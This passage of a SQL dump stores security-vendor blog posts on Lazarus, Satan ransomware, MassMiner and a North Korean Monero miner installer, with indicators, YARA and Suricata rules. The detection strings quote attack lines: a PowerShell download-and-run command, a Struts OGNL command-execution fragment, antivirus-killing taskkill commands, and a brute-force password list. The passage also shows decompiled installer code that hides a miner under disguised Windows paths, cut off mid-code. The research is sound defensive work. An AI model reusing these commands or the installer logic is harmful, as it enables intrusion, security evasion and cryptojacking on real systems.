\"\\\\x45\\\\x61\\\\x73\\\\x79\\\\x50\\\\x61\\\\x79\\\\x50\\\\x6c\\\\x75\\\\x67\\\\x69\\\\x6e\\\\x2e\\\\x45\\\\x50\\\\x70\\\\x6c\\\\x75\\\\x67\\\\x69\\\\x6e\\\\x2e\\\\x31\"\n\n                $a5 = \"\\\\x41\\\\x43\\\\x55\\\\x42\\\\x45\\\\x46\\\\x49\\\\x4c\\\\x45\\\\x43\\\\x54\\\\x52\\\\x4c\\\\x2e\\\\x41\\\\x63\\\\x75\\\\x62\\\\x65\\\\x46\\\\x69\\\\x6c\\\\x65\\\\x43\\\\x74\\\\x72\\\\x6c\\\\x43\\\\x74\\\\x72\\\\x6c\\\\x2e\\\\x31\"\n\n                $a6 = \"\\\\x44\\\\x55\\\\x5a\\\\x4f\\\\x4e\\\\x45\\\\x52\\\\x50\\\\x53\\\\x53\\\\x4f\\\\x2e\\\\x44\\\\x55\\\\x5a\\\\x4f\\\\x4e\\\\x45\\\\x52\\\\x50\\\\x53\\\\x53\\\\x4f\\\\x43\\\\x74\\\\x72\\\\x6c\\\\x2e\\\\x31\"\n\n                $a7 = \"SIClientAccess.SIClientAccess.1\"\n\n                $a8 = \"INIWALLET61.INIwallet61Ctrl.1\"\n\n        condition:\n\n                any of them\n\n}\n\nrule splwow32LazarusPayload {\n\n        strings:\n\n                $resp = \"TG9naW4gU3VjY2VzcyFcclxuV2VsY29tZSE=\"\n\n        condition:\n\n                uint16(0) == 0x5a4d and all of them\n\n}       Profiling Script URLshttp://aega[.]co.kr/mall/skin/skin.php?id=ksjdnkshttp://alphap1[.]com/hdd/images/image.php?id=ksjdnkshttp://www.peaceind[.]co.kr/board/icon/image.php?id=ksjdnkshttps://www.srider[.]net/www/custom.asp?id=sjhttp://www.peaceind[.]co.kr/board/skin_poll/gallery/result.php                         http://www.sejong[.]org/_lib/conf/conf.php                         http://www.sejong[.]org/js/jquery-1.5.3.min.js                         http://www.sejong[.]org/pub/inc/config.php                 Akdoor.R228914 Download URLhttp://www.peaceind[.]co.kr/board/skin_poll/gallery/poll.php                         Akdoor.R228914 File-Hashes9d3fd05a6f31cf4b7ab858825e58d8008d446fad9fddb03aeb8ee107bceb3641bcec9c6ff39106505c472c38c94e32773c03facda2e1064c20e3905894e9529ebf4a0fcfe8ef5205d1ca13c5040335df11daebee45c994bd7504f19937d8da20Akdoor.R228914 Command and Control Servers176.223.112[.]74164.132.209[.]191Akdoor.R228914 Network Detection (Suricata)alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"AV TROJAN Lazarus Akdoor.R228914 Response\"; flow:established,from_server; dsize:38; content:\"TG9naW4gU3VjY2VzcyFcclxuV2VsY29tZSE=|0d 0a|\"; depth:38; reference:md5,8796fda0510420f6a1daff6ed89851ab; classtype:trojan-activity; sid:xxx; rev:1;)OTX PulseYou can find additional indicators in OTX.', 'zerodaymalware researchactivex', '/blogs/labs-research/more-details-on-the-activex-vulnerability-recently-used-to-target-users-in-south-korea');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'Satan Ransomware Spawns New Methods to Spread', 'Javier Ruiz', 'June 1, 2018 ', 'Today, we are sharing an example of how previously known malware keeps evolving and adding new techniques to infect more systems.BleepingComputer first reported on Satan ransomware in January 2017. Recently, Satan Ransomware was identified as using the EternalBlue exploit to spread across compromised environments (BartBlaze’s blog). This is the same exploit associated with a previous WannaCry Ransomware campaign. While Microsoft patched the vulnerability associated with EternalBlue in March 2017, many environments remain vulnerable.Unusually, we’ve identified samples of Satan Ransomware that not only include EternalBlue,but also a far larger set of propagation methods:This Satan variant attempts to propagate through:JBoss CVE-2017-12149Weblogic CVE-2017-10271EternalBlue exploit CVE-2017-0143Tomcat web application brute forcingMalware AnalysisBelow is a sample from early May 2018 of Satan Ransomware using all the previously mentioned techniques, which we are going to analyze.Name: sts.exeFile size: 1.7 MbMD5: c290cd24892905fbcf3cb39929de19a5The first thing we see in the analyzed sample is that the malware was packed with the MPRESS packer:The main goal of this sample is to drop Satan Ransomware,encrypt the victim\'s host, and then request a Bitcoin payment. Afterwards, the sample will also try to spread in the network using exploits such as EternalBlue.EternalBlueThe malware drops several EternalBlue files in the victim’s host. These files are a public version of the exploit without any modifications or custom implementations. All are dropped in the folder C:\\Users\\All Users\\ in the infected system:Sts.exe initiates the process of spreading across the network by scanning all the systems within the same network segment. Through the following command line, systems vulnerable to SMB EternalBlue exploit will execute the previously dropped library down64.dll.The down64.dll attempts to load code in the target’s memory, and then downloads sts.exe, using the legitimate Microsoft certutil.exe tool. This is a known download technique described as Remote File Copy - T1105 in Mitre ATT&CK.So Many Exploits....The sample uses some other network activity to continue to spread across the network.A compromised system will make a HTTP PUT request to /Clist1.jsp to execute a jsp file that downloads another sample of sts.exe in the target server.Another interesting technique used to infect other systems is the ability to identify an Apache Tomcat server and bruteforce it. It makes an HTTP GET request to /manager/html, and if the response is “401 not authorized,” it then begins to bruteforce access to the file, using a list of most common usernames and passwords:EncryptionAfter infecting other systems in the same network, the sample finally drops Satan Ransomware into C:\\Satan.exe file. This executable is also packed with MPRESS as the original sample.Executing Satan.exe starts the ransomware attack, which first stops the following processes:Satan.exe creates a file named KSession located in “C:\\Windows\\Temp\\KSession” and stores a host identifier inside it.Encrypted files are renamed with [[email protected]].<original_filename>.satan file name. Then the process starts sending data to the Command and Control server, making GET requests using the parameter value stored in KSession file.GET /data/token.php?status=ST&code=XXXXXXXXXXXXXXXXXXXXXXXXX HTTP/1.1 Connection: Keep-AliveUser-Agent: Winnet ClientHost: 45.124.132.119After encryption, Satan.exe creates a note in C:\\_How_to_decrypt_files.txt with instructions, and then executes notepad to open the note.The note contains the instructions to decrypt the system and a contact email address: [email protected][.]ru, requesting a Bitcoin payment as seen below in a sample of the note:Tracking the previously mentioned Bitcoin wallet:14hCK6iRXwRkmBFRKG8kiSpCSpKmqtH2qo, has only received a handful of payments so far, with the latest payment made on May 12, 2018. It has a balance of 0.5 BTC, worth approximately $3600 at the time of writing.ConclusionIt’s a worrying trend that ransomware isn’t going away, and it is adapting to include the recent and diverse exploits/techniques to spread in more innovative and successful ways.Detect Satan Ransomware with AlienVault USMBecause threats like Satan Ransomware are constantly evolving with new methods, it’s critical that your detection tools always have the latest threat intelligence. AlienVault USM receives continuous threat intelligence updates from the AlienVault Labs Security Research Team and OTX. Using multiple built-in security capabilities, AlienVault USM detect many common behaviours of malware that change less frequently. The techniques used to spread Satan ransomware will trigger the following alarms in AlienVault USM:System Compromise - Suspicious Behavior - OTX Indicators of CompromiseDelivery & Attack - Suspicious Behavior - Certutil.exe used to download a fileDelivery & Attack - Vulnerability Scanning - JBoss ScanSystem Compromise - Suspicious Behavior - Command executed from an Oracle WebLogic processAnd also the following network activity:Weblogic XMLDecoder RCE (CVE-2017-10271) - Exploit - Code ExecutionTomcat Server - Environmental Awareness - Default CredentialsPossible ETERNALBLUE Exploit M3 MS17-010 - Exploit - Code Execution - ETERNALBLUESatan Ransomware - System Compromise - Ransomware infectionDetect Satan Ransomware with OTX Endpoint Threat HunterYou can hunt for malware and other threats for free using the OTX Endpoint Threat Hunter.This free service uses the indicators of compromise (IOCs) catalogued in OTX, enabling you to scan for threats on your endpoints. OTX Endpoint Threat Hunter detects Satan through:File and Network based indicators (below, and in OTX)Generic detection of exploits.Detection - Indicators of CompromiseFile-Hashes:3e3f8570c11dff0b5a0e061eae6bdd66cf9fa01d815658a0589d98873500358d15ffbb8d382cd2ff7b0bd4c87a7c0bffd1541c2fe86865af445123bc0b770d13b556b5c077e38dcb65d21a707c19618d02e0a65ff3f9887323728ec078660cc315292172a83f2e7f07114693ab92753ed32311dfba7d54fe36cc7229136874d90439628816cabe113315751e7113a9e9f720d7e499ffdd78acbac1ed8ba3588793027b47ef0b6f7d933017320951bbbeef792a8f1bc43b3fe96c2b61f1dc2636cde45f7ff05f52b7215e4b0ea1f2f42ad9b42031e16a3be9772aa09e014bacdb85b936960fbe5100c170b777e1647ce9f0f01e3ab9742dfc23f37cb0825b30b5ca63dbb99d9da431bf23aca80dc787df67bb01104fb9358a7813ed2fce479362db0831e19a4e3a736ea7498dadc2d6702342f75fd8f7fbae1894ee2e9738c2b4aa8adf96fc5a7e249a6a487faaf0ed3e00c40259fdae11d4caf47a24a9d3aaedbe8eb97d8171b8c91c6bc420346f7a6d2d2f76809a667ade03c990feffadaad50259d41720f7084716a3b2bbe34ac6d3021224420f81a4e839b0b3401e5ef29f50f329e034db96ba254328cd1e0f588af6126c341ed92ddf4aeb96bc76835937aceb27720115a63b9d47e737fd878a61c52435ea4ec86ba8e58ee744bc85c4f3cf25bdc6711a72713d80a4a860df724a79042be210930dcbfc522da72b39bb12b7d8fcc3fb533e5e0069e00bc5a68551479e54a990bb1b658e1bd092c0507d68b2a3172a1d676f00a62df376d8da805714553bb3221a8426f9823a8a5887daaaf0df80978b3a563077def7ba919e2f49e5883d24176e6b3371a8eef1efe2b06a5f30aa2fe338191b972705412b8043b0a134cdb287d754771fc225f2309e82eecf12eca0e10dc3370d7917e7678dc09629240d3e7cc71c5ac0df68576bea0682 IP Addresses:45.124.132.119 URI paths: /invoker/readonly /orders.xhtml /Clist1.jsp /manager/html /wls-wsat/CoordinatorPortType Thanks to Fernando Martinez and Chris Doman for collaborations.', 'malwareransomwarealienvault labssatan', '/blogs/labs-research/satan-ransomware-spawns-new-methods-to-spread');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'MassMiner Malware Targeting Web Servers', 'Chris Doman', 'May 1, 2018 ', 'Written in collaboration wih Fernando MartinezOne of the biggest malware-trends of 2018 has been the increasing variety of crypto-currency malware targeting servers.One family of mining malware, we’ve termed “MassMiner”, stands out as a worm that not only spreads itself through number of different exploits, but also brute-forces access to Microsoft SQL Servers. It surprised us how many different exploits and hacking tools it leverages in a single executable.MassMiner spreads first within the local network, before attempting to propagate across the wider internet:\n There are a number of different versions of MassMiner, and Honeypot data indicates they are continuing to spread:An infected MassMiner machine attempting to spread, using an exploit for Apache StrutsThis one site records infection attempts to their honeypots, most likely from infected systems, in the following countries:It’s likely these numbers represent just a minority of the infected systems.ReconnaissanceMassMiner includes a fork of MassScan, a tool that can scan the internet in under 6 minutes. The MassScan fork passes a list of IP ranges to scan during execution, which includes private and public IP ranges.ExploitationMassMiner then proceeds to run exploits against vulnerable systems, including:CVE-2017-10271 WebServer Exploit;CVE-2017-0143 SMB Exploit (EternalBlue, used to install DoublePulsar);CVE-2017-5638 Apache Struts Exploit; andBrute Forcing access to Microsoft SQL Servers using SQLckInstallationCompromised Microsoft SQL Servers are subjected first to a script that installs MassMiner:Installing MassMiner via SQLThen to a 1000+ line SQL script that disables a number of important security features:SQL Script disabling anti-virus protectionsWhereas compromised Weblogic servers download MassMiner via PowerShell:And a short VisualBasic script is used to deploy the malware to compromised Apache Struts servers:Setting up the environmentOnce the malware has been installed, it sets up the system to avoid detection and ensure persistence:It copies itself to ‘C:\\Windows\\ime\\taskhost.exe’ and the Startup folder for persistenceSchedules tasks to execute its componentsModifies ACL to grant full access to certain files in the system through running cacls.exe, with: cmd /c schtasks /create /sc minute /mo 1 /tn \'Flashfxl\' /ru system /tr \'cmd /c echo Y|cacls C:\\Windows\\TEMP\\Networks\\taskmgr.exe /p everyone:FKills the Windows Firewall with: cmd /c net stop MpsSvcCommand and ControlMassMiner first downloads a configuration file from http://server/Cfg.iniCfg.ini sample from a slightly different variant of MassMiner to our primary sampleThis specifies:The server to download updates from;The executable to infect other machines with; andThe Monero wallet and mining pool to send mined currency toHowever, if the http request for the config file is never responded, the malware is capable of successfully running the Miner with its default configuration.Gh0st BackdoorA sample we analysed also installs the classic Gh0st backdoor, which communicates with the domain rat.kingminer[.]club.Cashing OutWe’ve identified two Monero wallets belonging to the attackers:44qLwCLcifP4KZfkqwNJj4fTbQ8rkLCxJc3TW4UBwciZ95yWFuQD6mD4QeDusREBXMhHX9DzT5LBaWdVbsjStfjR9PXaV9L49Rocc2niuCTyVMakjq7zU7njgZq3deBwba3pTcGFjLnB2Gvxt8z6PsfEn4sc8WPPedTkGjQVHk2RLk7btk6Js8gKv9iLCiDetect MassMiner with OTX Endpoint Threat HunterWe recently released a free service in OTX, OTX Endpoint Threat Hunter, that enables you to hunt for indicators of compromise across your endpoints. OTX Endpoint Threat Hunter detects MassMiner through:File and Network based indicators (below, and in OTX)Generic detection of communication with mining pool servers and execution of mining softwareYara rules (below)AlienVault USM DetectionRather than just detecting individual exploits and malware families, AlienVault USM detects high-level behaviours that change less often. A MassMiner infection will trigger the following detections:Environmental Awareness - Suspicious Behavior - New Task ScheduledEnvironmental Awareness - Security Critical Event - Windows Firewall DisabledEnvironmental Awareness - Desktop Software - Bitcoin - Bitcoin MinerReconnaissance & Probing - Portscan - NmapDelivery & Attack - Brute Force Authentication - SQL ServerDelivery & Attack - Brute Force Authentication - MSSQL Server LoginDelivery & Attack - WebServer Attack - Code ExecutionSystem Compromise - Suspicious Security Critical Event - Taskill killing Antivirus processSystem Compromise - Suspicious Security Critical Event - Mass Process KillingSystem Compromise - Suspicious Behavior - OTX Indicators of CompromiseAnd the following network detections:Possible Apache Struts OGNL Expression Injection (CVE-2017-5638) - Exploit Web Attack - Code ExecutionPossible ETERNALBLUE Exploit M3 MS17-010 - Exploit - Code Execution - ETERNALBLUEWeblogic XMLDecoder RCE (CVE-2017-10271) - Exploit - Code ExecutionExecutable Download from dotted-quad Host - Suspicious Activity - Executable downloadPE EXE or DLL Windows file download HTTP - Suspicious Activity - Executable downloadDRIVEBY Likely Evil EXE with no referer from HFS webserver (used by Unknown EK) - Malware - Exploit KitLikely Evil EXE download from dotted Quad by MSXMLHTTP M1 - Suspicious Activity - Suspicious HTTP requestSUSPICIOUS Dotted Quad Host MZ Response - Suspicious Activity - Executable downloadUPX compressed file download possible malware - Suspicious Activity - Executable downloadEXE - Served Attached HTTP - Suspicious Activity - Executable downloadNMAP -sS window 1024 - Recon - ScannerQuery to a *.top domain - Likely Hostile - Suspicious Activity - DNS Query - Suspicious TLD or domainUnsupported/Fake Windows NT Version 5.0 - Suspicious Activity - Suspicious User-AgentHTTP Request to a *.top domain - Suspicious Activity - HTTP Request - Suspicious TLD or domainCryptocurrency Miner Checkin - Policy Violation - Coin minerWe will follow up this blog with a detailed analysis on how to generically detect such cryo-currency mining activity with osquery and Sysmon. Stay Tuned!Network Indicatorslist.idc3389[.]topdown.idc3389[.]topvps.idc3389[.]topdown.kingminer[.]club\n\nlist.kingminer[.]club\n\nrat.kingminer[.]clubppxvip1.ppxxmr[.]com (Mining Pool Server)Sample Hashes8522E61D14D3186996D5017031E269B124290396DA2C4CABE8C2437D165F07D9OTX Pulse   You can view the full set of indicators here.Yara Rules\nrule massminer_sql_downloader {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"f2b546f172c1162dbf719596b053dfd9\"   strings:       $a = \"SaveToFile(\\\"C:\\\\Windows\\\\temp\\\\searsvc.exe\\\")\" nocase wide ascii       $b = \"master.dbo.xp_regwrite \'HKEY_LOCAL_MACHINE\',\'SOFTWARE\\\\Microsoft\\\\Jet\\\\4.0\\\\Engines\',\'SandBoxMode\',\'REG_DWORD\',1\" nocase wide ascii   condition:       any of them}rule massminer_sql_installation_script {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"864802dfd37882b0d306b1fe9b2459a2\"   strings:       $a = \"secedit /configure /db secedit.sdb /cfg FuckGOthin.inf\" nocase wide ascii       $b = \"c:\\\\windows\\\\system32\\\\wbem\\\\vice.exe taskkill.EXE /e /t /g system:F\';exec sp_OAMethod @passwordftpcov\" nocase wide ascii       $c = \"657865632073705F636F6E666967757265202773686F7720616476616E636564206F7074696F\" nocase wide ascii       $d = \"taskkill /f /im 360safe.exe&taskkill /f /im 360sd.exe&taskkill /f /im 360rp.exe&taskkill /f /im 360rps.exe&taskkill /f /im 360tray.exe&taskkill /f /im ZhuDongFangYu&exit\" nocase wide ascii   condition:       any of them}rule massminer_sqlack_bruteforcer {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"755830fa887efe3adfe177f774089510\"   strings:       $a = \"SQLck -i IP.txt -p Pass.txt -o output.txt\" nocase wide ascii       $b = \"d:\\\\STORAGE\\\\niemic\\\\Documents\\\\Visual Studio Projects\\\\\" nocase wide ascii       $c = \"This is a tool for auditing the strength of your SQL login passwords\" nocase wide ascii   condition:       any of them}rule massminer_sqlack_passwordlist {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"a13f4d7e95c6429bd3cdcfa4bda1a50b\"   strings:       $a = \"1qa2ws3ed\" nocase wide ascii       $b = \"2sqlserver2000\" nocase wide ascii       $c = \"qwertyuiop[\" nocase wide ascii       $d = \"1qaz2wsx3edc\" nocase wide ascii       $e = \"QQ976428697\" nocase wide ascii   condition:       all of them}rule massminer_eternalblue_downloader {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"af0e08bff4ac83d29f71880b74abde5e\"   strings:       $a = \"\\\\1\\\\x64\\\\Release\\\\1.pdb\" nocase wide ascii       $b = \"C:\\\\Windows\\\\downloader.exe\" nocase wide ascii   condition:       any of them}rule massminer_eternalblue_configs {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"09d45ae26830115fd8d9cdc2aa640ca5\"   strings:       $a = \"Full path to the file containing Double Pulsar shellcode installer\" nocase wide ascii       $b = \"Set to true if the DOUBLEPULSAR backdoor was already installed and the exploit did not have to be thrown\" nocase wide ascii   condition:       any of them}rule massminer_eternalblue_exploit_one {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"08b6c44e03bf6648a09c80dd73655e18\"   strings:       $a = \"CNEFileIO_fileGetSizeByNameExWWithFileAccess\" nocase wide ascii   condition:       any of them}rule massminer_eternalblue_exploit_three {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"cf2a5731ec9c93227dadcfe3d539943e\"   strings:       $a = \"coli_create\" nocase wide ascii       $b = \"coli_delete\" nocase wide ascii       $c = \"coli_setCleanup\" nocase wide ascii       $d = \"coli_setID\" nocase wide ascii       $e = \"coli_setProcess\" nocase wide ascii       $f = \"coli_setValidatex\" nocase wide ascii   condition:       all of them}rule massminer_externalblue_exploit_four {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"22bb1452ca9bc4b8d346368d3f4db6c2\"   strings:       $a = \"coli-0.dll\" nocase wide ascii       $b = \"coli_setID\" nocase wide ascii       $c = \"trch-1.dll\" nocase wide ascii   condition:       all of them}rule massminer_gh0st {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"d4591a075422948408d5fc7d33df31b3\"   strings:       $a = \"Jklmnopq Stuvwxyab Defghij Lmnopqrs Uvw\" nocase wide ascii       $b = \"Local AppWizard-Generated Applications\" nocase wide ascii   condition:       all of them}rule massminer_xmrig_miner {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"458a2b86b2c610cc66b3aa081c45584b\"   strings:       $a = \"number of times to retry before switch to backup server\" nocase wide ascii       $b = \"Huge pages support was successfully enabled, but reboot required to use it\" nocase wide ascii   condition:       all of them}rule massminer_xmrig_config {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"490fb7bd62699dadef26dac8e88eefa3\"   strings:       $a = \"max-cpu-usage\" nocase wide ascii       $b = \"keepalive\" nocase wide ascii       $c = \"access-token\" nocase wide ascii       $d = \"cpu-affinity\" nocase wide ascii   condition:       all of them}rule massminer_weblogic_exploit_downloader {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"   strings:       $a = \"powershell (new-object System.Net.WebClient).DownloadFile(\'AAAAA\',\'BBBBB\');start BBBBB\" nocase wide ascii   condition:       any of them}rule massminer_massscan_xiugaijson_fork {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"       md5 = \"83ab969950c7d47e4de3ab82d7c0a62f\"   strings:       $a = \"masscan-master-xiugaijson\\\\bin\\\\masscan.pdb\" nocase wide ascii   condition:       any of them}rule massminer_struts_exploit_downloader {   meta:       author = \"AlienVault Labs\"       copyright = \"Alienvault Inc. 2018\"       license = \"Apache License, Version 2.0\"   strings:       $a = \"(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds))\" nocase wide ascii   condition:       any of them}', 'malwaremassminer', '/blogs/labs-research/massminer-malware-targeting-web-servers');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'A North Korean Monero Cryptocurrency Miner', 'Chris Doman', 'January 8, 2018 ', 'AlienVault labs recently analysed an application compiled on Christmas Eve 2017. It is an Installer for software to mine the Monero crypto-currency. Any mined currency is sent to Kim Il Sung University in Pyongyang, North Korea.The Installer copies a file named intelservice.exe to the system. The filename intelservice.exe is often associated with crypto-currency mining malware. Based on the arguments it’s executed with, it’s likely a piece of software called xmrig. It’s not unusual to see xmrig in malware campaigns. It was recently used in some wide campaigns exploiting unpatched IIS servers to mine Monero.The Installer executes Xmrig with the following command:\"-o barjuok.ryongnamsan.edu.kp:5615 -u 4JUdGzvrMFDWrUUwY... -p KJU\" + processorCount + \" -k -t \" + (processorCount -1)\"The installer passes xmrig the following arguments:4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS is the address of the Monero walletbarjuok.ryongnamsan.edu.kp is the mining server that would receive any mined currency. The ryongnamsan.edu.kp domain indicates this server is located at Kim Il Sung University.The password, KJU, is a possible reference to Kim Jong-unWhy was this application created?The hostname barjuok.ryongnamsan.edu.kp address doesn’t currently resolve. That means the software can’t send mined currency to the authors - on most networks.It may be that:The application is designed to be run within another network, such as that of the university itself;The address used to resolve but no longer does; orThe usage of a North Korean server is a prank to trick security researchers.It’s not clear if we’re looking at an early test of an attack, or part of a ‘legitimate’ mining operation where the owners of the hardware are aware of the mining.On the one hand the sample contains obvious messages printed for debugging that an attacker would avoid. But it also contains fake filenames that appear to be an attempt to avoid detection of the installed mining software.If the software author is at KSU, they may not be North Korean. KSU is an unusually open University, and has a number of foreign students and lecturers.Photo of KSU from exploredprk.comRelated SamplesWe identified two other pieces of software which share some code:762c3249904a8bf76802effb5442665542344bb45f351757e8638656e12a0135These samples are even simpler, and may be:Earlier prototypes; orSoftware created by entirely different authors that copied code from the same location, for example a forum.Based on the compilation string, initial upload location and French text - it’s likely the author of these two other samples is from Morocco. Therefore 2) may be the more likely scenario. Unless all three samples are a prank by Moroccan hackers.Monero mining linked to North Korea attackersThere are previous reports of North Korean attackers mining Monero:A group known as Bluenorroff mined Monero on compromised servers during an attempted theft from a bank; andA group known as Andariel mined Monero on the network of a South Korean company they had compromised.Whilst naming conventions differ somewhat between vendors, Bluenorroff and Andariel are generally considered part of a wider set of attackers known as Lazarus:Bluenorroff are best known for the partially successful theft of $951 million from the Bank of Bangladesh.Andariel are perhaps a later evolution of BlackMine mentioned above. They are notable for recent thefts from the South Korean Ministry of Defense.Lazarus consists of a number of related groups of attackers. They are not the only “high-level” group of attackers with reported links to North Korea.We have not identified anything linking our Installer to these attacks. The Lazarus attackers have capable developers, and craft their own malware from a library of low-level code. Given the amateur usage of Visual Basic programming in the Installer we analysed, it’s unlikely the author is part of Lazarus. As the mining server is located in a university, we may be looking at a university project.Events in May 2017When talking about North Korea and crypto-currencies it’s worth noting a particular timeline of events. All three of the following events occurred in May 2017 - suggesting a possible sudden central tasking to exploit crypto-currencies:The WannaCry ransomware attacks;First reported compromise of a BitCoin exchange (Bithumb) linked to North Korea; andThe first BitCoin mining inside North Korea, as reported by RecordedFuture.Bitcoin Trading from North KoreaNorth Korea has a very small number of IP addresses assigned to it, which makes interesting events from such IP addresses more noteworthy.One such IP address, 175.45.178.19, has been active on BitCoin trading sites:This IP address is fairly notorious. It was used to control compromised web-servers in a set of 2014/2015 attacks linked to North Korea known as BlackMine. Given the small number of IP addresses assigned to North Korea it’s probably just a coincidental link. You can also see North Korean IPs torrenting a number of Top Gear series, with a particular fondness for documentaries by James May. Following a similar logic we can’t reliably say that North Korean attackers are big Top Gear fans, though it appears someone with internet access in the country is. The IP overlap is not strong evidence that the same people executing the hacking operations are engaged in trading Bitcoin.ConclusionCrypto-currencies could provide a financial lifeline to a country hit hard by sanctions. Therefore it’s not surprising that universities in North Korea have shown a clear interest in cryptocurrencies. Recently the Pyongyang University of Science and Technology invited foreign experts to lecture on crypto-currencies. The Installer we’ve analysed above may be the most recent product of their endeavours.AppendixAdditional indicators of compromise are available within our OTX Pulse.  File-Hashes6a261443299788af1467142d5f538b2c762c3249904a8bf76802effb5442665542344bb45f351757e8638656e12a0135File-PathC:\\Windows\\Sys64\\intelservice.exeYara Rulerule nkminer_monero {\n\n   meta:\n\n       description = \"Detects installer of Monero miner that points to a NK domain\"\n\n       author = \"[email protected]\"\n\n       tlp = \"white\"\n\n       license = \"MIT License\"\n\n   strings:\n\n       $a = \"82e999fb-a6e0-4094-aa1f-1a306069d1a5\" nocase wide ascii\n\n       $b = \"4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS\" nocase wide ascii\n\n       $c = \"barjuok.ryongnamsan.edu.kp\" nocase wide ascii\n\n       $d = \"C:\\\\SoftwaresInstall\\\\soft\" nocase wide ascii\n\n       $e = \"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\" nocase wide ascii\n\n       $f = \"C:\\\\Windows\\\\Sys64\\\\updater.exe\" nocase wide ascii\n\n       $g = \"C:\\\\Users\\\\Jawhar\\\\documents\\\\\" nocase wide ascii\n\n   condition:\n\n       any of them\n\n}Yara rules for xmrig are available hereDecompiled Code of 6a261443299788af1467142d5f538b2c using System;using System.Diagnostics;using System.IO;using System.Runtime.CompilerServices;using Microsoft.VisualBasic;using Microsoft.VisualBasic.CompilerServices; namespace ConsoleApp5{   // Token: 0x02000008 RID: 8   [StandardModule]   internal sealed class Module1   {       // Token: 0x0600000F RID: 15 RVA: 0x00002128 File Offset: 0x00000328       [STAThread]       public static void Main()       {           Console.WriteLine(\"Aucun argument\");           char[] array = \"ABDCEFGHIJKLNMOPQRSTVUWXYZ\".ToCharArray();           char[] array2 = \"0123456789\".ToCharArray();           Random random = new Random();           string text = string.Empty;           while (text.Length < 6)           {               if (random.Next(0, 2) == 0)               {                   text += Conversions.ToString(array[random.Next(0, array.Length)]);               }               else               {                   text += Conversions.ToString(array2[random.Next(0, array2.Length)]);               }           }           Console.WriteLine(text);           if (!Directory.Exists(\"C:\\\\Windows\\\\Sys64\"))           {               Directory.CreateDirectory(\"C:\\\\Windows\\\\Sys64\");           }           if (!Directory.Exists(\"C:\\\\SoftwaresInstall\"))           {               Directory.CreateDirectory(\"C:\\\\SoftwaresInstall\");           }           if (!File.Exists(\"C:\\\\Windows\\\\Sys64\\\\updater.exe\"))           {               File.Copy(\"licence/key.dat\", \"C:\\\\Windows\\\\Sys64\\\\updater.exe\");           }           if (!File.Exists(\"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\"))           {               File.Copy(\"licence\\\\licence.dat\", \"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\");           }           File.Copy(\"setup\\\\update.exe\", \"C:\\\\SoftwaresInstall\\\\soft\" + text + \".exe\");           object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\"WScript.Shell\", \"\"));           objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(\"WScript.Shell\", \"\"));           object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, \"SpecialFolders\", new object[]           {               \"Desktop\"           }, null, null, null));           object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, \"CreateShortcut\", new object[]           {               Operators.ConcatenateObject(objectValue2, \"\\\\shortcut.lnk\")           }, null, null, null));           NewLateBinding.LateSet(objectValue3, null, \"TargetPath\", new object[]           {               NewLateBinding.LateGet(objectValue, null, \"ExpandEnvironmentStrings\", new object[]               {                   \"C:\\\\Windows\\\\Sys64\\\\updater.exe\"               }, null, null, null)           }, null, null);           NewLateBinding.LateSet(objectValue3, null, \"WorkingDirectory\", new object[]           {               NewLateBinding.LateGet(objectValue, null, \"ExpandEnvironmentStrings\", new object[]               {                   \"C:\\\\Windows\\\\Sys64\"               }, null, null, null)           }, null, null);           NewLateBinding.LateSet(objectValue3, null, \"WindowStyle\", new object[]           {               4           }, null, null);           NewLateBinding.LateCall(objectValue3, null, \"Save\", new object[0], null, null, null, true);           